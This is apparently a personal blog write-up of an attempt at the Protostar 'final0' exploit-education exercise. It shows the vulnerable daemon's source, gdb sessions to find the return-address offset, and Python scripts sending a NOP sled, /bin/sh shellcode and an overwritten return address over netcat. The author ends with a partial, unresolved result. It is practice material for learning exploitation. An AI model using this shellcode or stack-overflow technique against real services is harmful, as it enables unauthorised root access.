---
layout: post
title:  "Protostar final-zero-fail1 challenge"
date:   2019-02-27 18:26:36 +0530
categories: exploit.education protostar final-zero-fail1
---
We now start with final series of protostar exercises. [final-zero][final-zero-link]

{% highlight cpp %}
#include "../common/common.c"

#define NAME "final0"
#define UID 0
#define GID 0
#define PORT 2995

/*
 * Read the username in from the network
 */

char *get_username()
{
  char buffer[512];
  char *q;
  int i;

  memset(buffer, 0, sizeof(buffer));
  gets(buffer);

  /* Strip off trailing new line characters */
  q = strchr(buffer, '\n');
  if(q) *q = 0;
  q = strchr(buffer, '\r');
  if(q) *q = 0;

  /* Convert to lower case */
  for(i = 0; i < strlen(buffer); i++) {
      buffer[i] = toupper(buffer[i]);
  }

  /* Duplicate the string and return it */
  return strdup(buffer);
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  username = get_username();
  
  printf("No such user %s\n", username);
}
The network part of code is same as previous network series exercises [net-zero][net-zero-link].
The vulnerability is in `gets(buffer);` and we can overwrite `RET` to direct execution to our `shell-code` placed on the stack.
But the program also converts all ASCII in range `0x61 – 0x7a` to `toupper(buffer[i])`. So any value in our `shell-code` in this range will be changed.
We can overcome this by appending `\x00` before `shell-code` as `strlen` reads only uptil `\x00`.
Also the code converts `\n` ie ASCII `\x0a` to `0`

First we need to find start of buffer and how further its from `RET`. 
{% highlight shell %}
user@protostar:~$ python -c "print 'A'*532 + '\xef\xbe\xad\xde'" | nc 127.0.0.1 2995
user@protostar:~$ su root
Password: 
root@protostar:/home/user# gdb -q -c /tmp/core.11.final0.1532
Core was generated by '/opt/protostar/bin/final0'.
Program terminated with signal 11, Segmentation fault.
#0  0xdeadbeef in ?? ()
(gdb) x/50x $esp-600
0xbffffa08: 0xbffffa28  0xb7f0a068  0x0804b008  0xbffffa48
0xbffffa18: 0x00000201  0x00000200  0x00000000  0x00000000
0xbffffa28: 0xbffffc58  0x0804982a  0xbffffa48  0x0000000d
0xbffffa38: 0x00000200  0x00000567  0xb7e9c894  0x0d696910
0xbffffa48: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffffa58: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffffa68: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffffa78: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffffa88: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffffa98: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffffaa8: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffffab8: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffffac8: 0x41414141  0x41414141
(gdb)
{% endhighlight %}
After some manual checks i found `RET` is 532 away from buffer.
Also we see in `gdb` that buffer starts from `0xbffffa48`
Now lets create exploit code to return to our shellcode and run is against our binary.
{% highlight shell %}
user@protostar:~$ cat final0.py 
sc = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x18\x59\x31\xc0\x88\x41\x07\x89\x71\x08\x89\x41\x0c\xb0\x0b\x8d\x19\x8d\x51\x0c\x8d\x49\x08\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
alen = 531 - len(sc)
print "\x90"*alen + "\n" + sc + "\x48\xfa\xff\xbf"
user@protostar:~$ python final0.py | nc 127.0.0.1 2995
No such user ���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
user@protostar:~$ ls /tmp
user@protostar:~$
{% endhighlight %}
Oops. Did not work as expected. Also no core-dump generated to explore in gdb. Phew. Lets connect to process to check it otherwise.
{% highlight shell %}
user@protostar:~$ su root
Password: 
root@protostar:/home/user# gdb -p `pidof final0`
(no debugging symbols found)...done.
Loaded symbols for /lib/ld-linux.so.2
accept () at ../sysdeps/unix/sysv/linux/i386/socket.S:64
64  ../sysdeps/unix/sysv/linux/i386/socket.S: No such file or directory.
  in ../sysdeps/unix/sysv/linux/i386/socket.S
(gdb) set follow-fork-mode child
Current language:  auto
The current source language is "auto; currently asm".
(gdb) b *0x0804978b `to get buf address`
Breakpoint 1 at 0x804978b: file final0/final0.c, line 19. 
(gdb) b *0x08049790 `to check out values copied properly`
Breakpoint 2 at 0x8049790: file final0/final0.c, line 22.
(gdb) b *0x080497c6 `to check how it was modified after 1st strchr`
Breakpoint 3 at 0x80497c6: file final0/final0.c, line 24.
(gdb) c
Continuing. -> In separte terminal we rerun `user@protostar:~$ python final0.py | nc 127.0.0.1 2995`
Breakpoint 1, 0x0804978b in get_username () at final0/final0.c:19
19  final0/final0.c: No such file or directory.
  in final0/final0.c
(gdb) x/x $esp
0xbffffa30: 0xbffffa48
(gdb) c
Continuing.
Breakpoint 2, get_username () at final0/final0.c:22
22  in final0/final0.c
(gdb) x/50x 0xbffffa48+350
0xbffffba6: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffbb6: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffbc6: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffbd6: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffbe6: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffbf6: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc06: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc16: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc26: 0x90909090  0x00000090  0x00000000  0x00000000
0xbffffc36: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffffc46: 0x00020000  0x00000000  0x10400000  0x7ff4b7ff
0xbffffc56: 0xfc88b7fd  0x9879bfff  0x00040804  0x00000000
0xbffffc66: 0x00000000  0xfc880000
[New process 1623]
Program exited with code 0361.
{% endhighlight %}
We connect to process in root mode. Also we set gdb to follow child process. We set breakpoint before(to get buf address)/after `gets` and just before second `strchr`.
We check area around end of NOPs where our shell code should have started ie `0xbffffc26` but we see it is invalid `0000`. This maybe due to `\n` not taking further chars. I dont know. Lets instead try with passing `NULL \0` ie `\x00` as separator. We again set 3 breakpoints as above to check if things we copied properly.

(gdb) x/50x 0xbffffa48+350
0xbffffba6: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffbb6: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffbc6: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffbd6: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffbe6: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffbf6: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc06: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc16: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffc26: 0x90909090  0xc0310090  0xdb3146b0  0x80cdc931
0xbffffc36: 0x315918eb  0x074188c0  0x89087189  0x0bb00c41
0xbffffc46: 0x518d198d  0x08498d0c  0xe3e880cd  0x2fffffff
0xbffffc56: 0x2f6e6962  0xfa486873  0x0000bfff  0x00000000
0xbffffc66: 0x00000000  0xfc880000
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xbffffc2b in ?? ()

Well what! We see data is copied correctly this time but it gives segfault for instruction at `0xbffffc2b`.
`0xbffffc2b` is where we wrote `\x00`. Huh. Seems our attemt to escape toupper was successfull but what gives.
I also tried giving return address direct to start of shellcode but that method is also giving some error.
Further i tried to put shellcode after my `RET` and direct `RET` to `\x60\xfc\xff\xbf`
{% highlight shell %}
user@protostar:~$ cat final0.py 
sc = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x18\x59\x31\xc0\x88\x41\x07\x89\x71\x08\x89\x41\x0c\xb0\x0b\x8d\x19\x8d\x51\x0c\x8d\x49\x08\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
alen = 532
print "\x90"*alen + "\x60\xfc\xff\xbf" + sc
The current source language is "auto; currently asm".
(gdb) c
Continuing.
[New process 1738]
Executing new program: /bin/dash
{% endhighlight %}
Yay. We did get `Executing new program: /bin/dash` but in terminal from where python run, i am unable to run commands like `ls`. Just no output. What is going on?????

First i should not use stack to keep shellcode. It is highly unpredictable. Also i should pass data over network(changes in python).
Well i will get back to this exercise later again.

[final-zero-link]:https://exploit.education/protostar/final-zero/
[net-zero-link]:https://exploit.education/protostar/net-zero/